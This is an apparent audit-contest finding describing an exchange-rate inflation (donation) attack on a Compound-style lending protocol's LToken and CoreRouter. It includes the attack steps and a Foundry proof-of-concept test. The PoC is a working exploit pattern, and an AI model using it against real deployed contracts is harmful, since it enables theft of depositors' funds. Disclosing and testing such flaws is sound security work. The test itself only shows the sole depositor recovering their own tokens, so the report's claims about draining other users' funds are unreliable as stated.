# Possible manipulation of exchangeRateStored() can cause inflation attack and drain tokens

### Summary

The exchange rate in the `LToken` contract can be artificially inflated by directly transferring underlying tokens to the `LToken` contract without minting new lTokens. This allows an attacker to redeem a disproportionately large amount of the underlying token with a small number of lTokens, draining the pool and leading to loss of funds for other users.

### Root Cause

The `exchangeRateStored()` function in Compound-style lending protocols calculates the exchange rate as:

```solidity
exchangeRate = (cash + borrows - reserves) / totalSupply
```

If a large amount of the underlying token is sent directly to the `LToken` contract (i.e., without calling `mint()`), `cash` increases but `totalSupply` remains unchanged, inflating the `exchangeRate`. Later redemptions (even small) result in significantly more underlying tokens being withdrawn than expected.

In `CoreRouter::redeem`:- [L124](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L115): the `exchangeRateStored()` is used to calculate expected underlying, but it may already be manipulated.

### Internal Pre-conditions

- The attacker holds a small amount of lTokens (e.g., 1–2 units).
- The protocol relies on `exchangeRateStored()` to calculate redemption value.

### External Pre-conditions

- The `LToken` contract allows direct transfer of the underlying asset to itself (standard ERC20 behavior).
- There is no guard or check against `exchangeRate` manipulation.

### Attack Path

1. Attacker supplies a small amount of tokens via `CoreRouter.supply()`, receiving some lTokens.
2. Attacker redeems most of them, keeping just a few lTokens.
3. Attacker sends a large amount of the underlying token directly to the `LToken` contract (without minting).
4. This increases `cash` in the contract, but `totalSupply` remains unchanged, inflating the `exchangeRateStored()`.
5. Attacker uses `CoreRouter.redeem()` for their remaining lTokens.
6. Due to the manipulated exchange rate, attacker redeems almost all tokens from the pool.

### Impact

This results in a critical pool drain — users who haven’t redeemed yet will find their tokens worthless or significantly reduced in value. This is a classical "exchange rate inflation" vulnerability and can result in:

- Total pool imbalance.
- Other users being unable to withdraw.
- Systemic risk if used across multiple tokens.

**The Test**
```solidity
function testInflationAttackWithCoreRouter() public {
    address attacker = makeAddr("attacker");

    address token = supportedTokens[0];
    address lToken = lTokens[0];

    // 1. Mint tokens to attacker
    ERC20Mock(token).mint(attacker, 1_000 ether);

    // 2. Attacker approves and supplies a small amount
    vm.startPrank(attacker);
    ERC20Mock(token).approve(address(coreRouter), type(uint256).max);
    coreRouter.supply(10 ether, token);

    uint256 initialExchangeRate = LToken(lToken).exchangeRateStored();
    console2.log("Initial exchange rate after supply:", initialExchangeRate);

    // 3. Attacker redeems almost all lTokens
    uint256 invests = lendStorage.totalInvestment(attacker, lToken);
    uint256 investsMinusOne = 4e10;
    LErc20(lToken).approve(address(coreRouter), type(uint256).max);
    coreRouter.redeem(invests - investsMinusOne, payable(lToken));

    assertEq(lendStorage.totalInvestment(attacker, lToken), investsMinusOne);

    // 4. Direct transfer to lToken contract to manipulate exchange rate
    ERC20Mock(token).transfer(lToken, 990 ether);
    vm.stopPrank();

    uint256 inflatedRate = LToken(lToken).exchangeRateStored();
    console2.log("Exchange rate after direct transfer:", inflatedRate);

    // 5. Final redemption of the remaining lTokens
    vm.startPrank(attacker);
    coreRouter.redeem(investsMinusOne, payable(lToken));
    vm.stopPrank();

    // 6. Remaining funds should be near zero (i.e., drained)
    uint256 remaining = ERC20Mock(token).balanceOf(lToken);
    console2.log("Remaining in lToken after exploit:", remaining);
    assertLe(remaining, 1 ether);
}
```
